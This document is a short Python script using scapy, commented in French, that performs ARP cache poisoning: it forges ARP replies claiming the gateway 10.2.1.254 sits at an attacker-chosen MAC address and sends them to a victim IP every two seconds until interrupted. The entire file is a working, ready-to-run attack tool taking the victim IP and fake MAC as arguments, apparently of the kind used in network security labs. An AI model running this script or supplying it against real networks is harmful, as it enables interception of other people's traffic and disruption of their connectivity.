#!/usr/bin/env python3

from scapy.all import *
import sys

def arp_poison(victim_ip, fake_mac):
    try:
        broadcast_mac = "ff:ff:ff:ff:ff:ff"

        gateway_ip = "10.2.1.254"
        arp_response = ARP(
            op=2,  # 2 pour une réponse ARP
            pdst=victim_ip,  # IP de la victime
            hwdst=broadcast_mac,  # Adresse MAC de la victime
            psrc=gateway_ip,  # Adresse IP de la passerelle (spoofée)
            hwsrc=fake_mac  # Fausse adresse MAC
        )
        
        print(f"[+] Injection d'un faux ARP : {gateway_ip} -> {fake_mac} vers {victim_ip}")
        
        while True:
            send(arp_response, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Arrêt de l'attaque.")
        sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <victim_ip> <fake_mac>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    fake_mac = sys.argv[2]

    arp_poison(victim_ip, fake_mac)

